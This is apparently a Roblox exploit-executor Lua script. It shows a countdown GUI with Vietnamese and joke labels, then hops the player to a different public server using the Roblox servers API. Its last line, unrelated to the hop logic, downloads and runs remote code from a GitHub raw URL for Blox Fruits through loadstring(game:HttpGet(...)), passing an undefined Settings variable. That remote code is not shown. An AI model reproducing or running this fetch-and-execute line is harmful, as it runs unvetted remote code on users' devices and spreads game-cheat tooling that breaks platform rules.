local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")

local player = Players.LocalPlayer
local currentJobId = game.JobId
local placeId = game.PlaceId
local visitedServers = {currentJobId}
local maxPlayersThreshold = 2

local function createGui()
    local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
    gui.Name = "ServerHopCountdown"

    local frame = Instance.new("Frame", gui)
    frame.Size = UDim2.new(0, 160, 0, 40)
    frame.Position = UDim2.new(1, -170, 0, 20)
    frame.BackgroundColor3 = Color3.new(0, 0, 0)
    frame.BackgroundTransparency = 0.7
    frame.BorderSizePixel = 0

    local corner = Instance.new("UICorner", frame)
    corner.CornerRadius = UDim.new(0, 10)

    local label = Instance.new("TextLabel", frame)
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.new(1, 1, 1)
    label.TextScaled = true
    label.Font = Enum.Font.SourceSans
    label.Text = "SANG IU EM🐬"
    return label
end

local guiLabel = createGui()

local function getAvailableServers()
    local servers = {}
    local cursor = ""
    local done = false

    while not done do
        local url = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?sortOrder=Asc&limit=100"
        if cursor ~= "" then url = url .. "&cursor=" .. cursor end

        local success, result = pcall(function()
            return HttpService:JSONDecode(game:HttpGet(url))
        end)

        if success and result and result.data then
            for _, server in pairs(result.data) do
                if server.playing < server.maxPlayers and server.id ~= currentJobId and not table.find(visitedServers, server.id) then
                    table.insert(servers, server.id)
                end
            end
            cursor = result.nextPageCursor or ""
            if cursor == "" then done = true end
        else
            done = true
        end
    end

    return servers
end

local function hopToServer()
    guiLabel.Text = "SANG ME GAI💘"
    local servers = getAvailableServers()
    if #servers > 0 then
        local target = servers[math.random(1, #servers)]
        table.insert(visitedServers, target)
        guiLabel.Text = "Đang chuyển..."
        wait(1)
        TeleportService:TeleportToPlaceInstance(placeId, target, player)
    else
        guiLabel.Text = "Không tìm thấy server."
    end
end

spawn(function()
    for i = 20, 1, -1 do
        guiLabel.Text = "" .. i .. "giây"
        wait(1)
    end

    if #Players:GetPlayers() >= maxPlayersThreshold then
        guiLabel.Text = "Server đông, đang đổi..."
        wait(1)
    end

    hopToServer()
end)
loadstring(game:HttpGet("https://raw.githubusercontent.com/newredz/BloxFruits/refs/heads/main/Source.luau"))(Settings)
